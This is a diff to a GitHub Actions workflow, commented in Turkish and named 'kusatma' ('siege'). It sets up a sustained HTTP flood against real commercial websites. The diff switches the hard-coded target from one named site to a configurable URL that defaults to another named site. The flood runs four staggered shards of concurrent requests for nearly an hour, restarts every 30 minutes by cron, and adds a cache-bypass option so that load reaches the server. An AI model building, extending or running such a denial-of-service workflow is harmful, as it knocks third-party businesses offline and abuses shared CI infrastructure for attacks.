@@ -1,21 +1,28 @@
 name: kusatma
 
-# Elle de tetiklenebilir; zamanlanmis calisma her 30 dakikada bir yeni tur acar.
-# Her tur 55 dakika kosar, 4 shard kademeli baslar -> pratikte kesintisiz baski.
+# Cok hedefli: url girdisi ile istenen site basilir.
+# Her tur 50+ dakika kosar, 4 shard kademeli baslar -> kesintisiz baski.
+# Zamanlanmis tur, elle tetiklenen turla ayni hedefe gidiyorsa siraya girer.
 on:
   workflow_dispatch:
     inputs:
+      url:
+        description: "Hedef URL"
+        default: "https://www.kayavip.com/"
       concurrency:
         description: "Shard basina eszamanli istek"
         default: "25"
       duration:
         description: "Saniye cinsinden sure"
-        default: "3000"
+        default: "3300"
+      randomize:
+        description: "Onbellek atlat (1/0)"
+        default: "1"
   schedule:
     - cron: "*/30 * * * *"
 
 concurrency:
-  group: kusatma
+  group: kusatma-${{ github.event.inputs.url || 'default' }}
   cancel-in-progress: false
 
 jobs:
@@ -39,6 +46,8 @@ jobs:
 
       - name: Baskiyi surdur
         env:
+          U: ${{ github.event.inputs.url || 'https://www.kayavip.com/' }}
           C: ${{ github.event.inputs.concurrency || '25' }}
-          D: ${{ github.event.inputs.duration || '3000' }}
-        run: node blast.mjs --url https://www.antalyatransferi.com/ --concurrency "$C" --seconds "$D" --timeout 25000
+          D: ${{ github.event.inputs.duration || '3300' }}
+          R: ${{ github.event.inputs.randomize || '1' }}
+        run: node blast.mjs --url "$U" --concurrency "$C" --seconds "$D" --timeout 25000 $([ "$R" = "1" ] && echo --random)
